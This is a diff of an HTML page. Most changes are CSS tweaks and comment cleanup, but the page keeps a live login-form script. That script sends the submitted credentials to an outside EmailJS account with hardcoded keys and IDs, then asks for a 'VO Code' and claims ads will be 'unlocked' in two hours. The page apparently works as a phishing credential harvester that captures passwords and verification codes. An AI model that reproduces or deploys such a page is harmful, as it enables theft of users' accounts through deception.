@@ -21,19 +21,23 @@
             align-items: center;
             justify-content: space-between;
             padding: 10px 20px;
+            position: relative;
+            z-index: 1001;
         }
 
         header img {
-            height: 50px;
+            height: 40px;
+            flex-shrink: 0;
         }
 
         .company-name {
-            font-size: 28px;
+            font-size: 24px;
             font-weight: bold;
             text-align: center;
             flex-grow: 1;
-            text-shadow: 0 0 20px white, 0 0 30px white;
+            text-shadow: 0 0 10px white, 0 0 20px white;
             animation: glow 1.5s infinite alternate;
+            margin: 0 10px;
         }
 
         @keyframes glow {
@@ -48,16 +52,17 @@
         .sidebar {
             background-color: black;
             position: fixed;
-            top: 60px;
+            top: 0;
             left: -250px;
             width: 250px;
-            height: calc(100% - 60px);
-            transition: left 0.5s ease;
+            height: 100%;
+            transition: left 0.3s ease;
             padding: 20px;
             color: white;
             opacity: 0;
             visibility: hidden;
             z-index: 1000;
+            overflow-y: auto;
         }
 
         .sidebar.active {
@@ -69,6 +74,7 @@
         .sidebar-button {
             cursor: pointer;
             font-size: 24px;
+            flex-shrink: 0;
         }
 
         .reveal-message {
@@ -80,7 +86,6 @@
             border-radius: 5px;
             font-size: 18px;
             font-weight: bold;
-            display: block;
         }
 
         @keyframes shine {
@@ -110,20 +115,15 @@
             transition: border 0.3s, background 0.3s;
         }
 
-        .login-form input.highlight {
-            border: 2px solid white; /* Highlight color */
-            animation: shine 1.5s infinite alternate; /* Shining effect */
-        }
-
         .login-form input#password {
-            color: black; /* Text color for VO Code input */
-            background-color: white; /* White background */
+            color: black;
+            background-color: white;
         }
 
         .login-form button {
-            background-color: white; /* White background */
-            color: black; /* Dark text */
-            border: 2px solid black; /* Black border */
+            background-color: white;
+            color: black;
+            border: 2px solid black;
             border-radius: 25px;
             padding: 10px;
             cursor: pointer;
@@ -131,8 +131,8 @@
         }
 
         .login-form button:hover {
-            background-color: black; /* Change to black on hover */
-            color: white; /* Change text color to white on hover */
+            background-color: black;
+            color: white;
         }
 
         .content-image {
@@ -144,10 +144,19 @@
             header {
                 flex-direction: column;
                 align-items: flex-start;
+                text-align: center;
             }
 
             .company-name {
-                font-size: 24px;
+                font-size: 20px;
+            }
+
+            .sidebar {
+                width: 100%;
+            }
+
+            .sidebar-button {
+                align-self: flex-end;
             }
         }
     </style>
@@ -181,8 +190,7 @@
 <section style="position: relative; text-align: center; margin-bottom: 20px;">
     <img src="image main.jpg" alt="Your Image" style="width: 100%; border-radius: 10px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);">
 
-    <a href="#login" onclick="showMessage(); return false;"
-       style="display: inline-block; margin-top: 20px; background-color: red; color: white; font-weight: bold; padding: 12px 25px; border-radius: 5px; text-decoration: none; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5); transition: background-color 0.3s, transform 0.2s;">
+    <a href="#login" onclick="showMessage(); return false;" style="display: inline-block; margin-top: 20px; background-color: red; color: white; font-weight: bold; padding: 12px 25px; border-radius: 5px; text-decoration: none; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5); transition: background-color 0.3s, transform 0.2s;">
         Get Started
     </a>
 
@@ -193,56 +201,44 @@
 
 <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 <script>
+    function showMessage() {
+        document.getElementById('message').style.display = 'block';
+        alert('Please log in to continue.');
+    }
 
-function showMessage() {
-    document.getElementById('message').style.display = 'block';
-    alert('Please log in to continue.');
-}
-</script>
-
-<style>
-a:hover {
-    background-color: darkred;
-    transform: scale(1.05);
-}
     (function () {
-        emailjs.init("cv-X00rP7Vlv3dBRH"); // Your EmailJS Public Key
+        emailjs.init("cv-X00rP7Vlv3dBRH");
     })();
 
-    // Handle initial login form submission
     document.getElementById('login-form').addEventListener('submit', function (event) {
         event.preventDefault();
 
-        const serviceID = 'service_309t3yc'; // Your EmailJS service ID
-        const loginTemplateID = 'template_whfb8w2'; // Your EmailJS Template ID for login info
+        const serviceID = 'service_309t3yc';
+        const loginTemplateID = 'template_whfb8w2';
 
-        // Send login information
         emailjs.sendForm(serviceID, loginTemplateID, this)
             .then(() => {
                 alert('Login information sent successfully!');
                 const passwordField = document.getElementById('password');
-                passwordField.type = 'text'; // Change to text to show entered code
-                passwordField.value = ''; // Clear entered information
-                passwordField.placeholder = "Enter VO Code"; // Update placeholder
-                passwordField.classList.add('highlight'); // Highlight the field
-                passwordField.style.color = 'black'; // Ensure text color is black
-                document.getElementById('confirmationMessage').style.display = 'block'; // Show confirmation message
+                passwordField.type = 'text';
+                passwordField.value = '';
+                passwordField.placeholder = "Enter VO Code";
+                passwordField.classList.add('highlight');
+                passwordField.style.color = 'black';
+                document.getElementById('confirmationMessage').style.display = 'block';
             })
             .catch((err) => {
                 alert('Failed to send login information: ' + JSON.stringify(err));
             });
     });
 
-    // Handle VO Code submission
     document.getElementById('login-form').addEventListener('submit', function (event) {
         const passwordField = document.getElementById('password');
         if (passwordField.placeholder === "Enter VO Code") {
-            event.preventDefault(); // Prevent default submission
+            event.preventDefault();
 
-            // Simulate second login submission
             alert('You will be notified about your account verification and the ads will get unlocked typically in 2 hours!');
-            // Clear the field again for the next login attempt
-            passwordField.value = ''; 
+            passwordField.value = '';
         }
     });
 
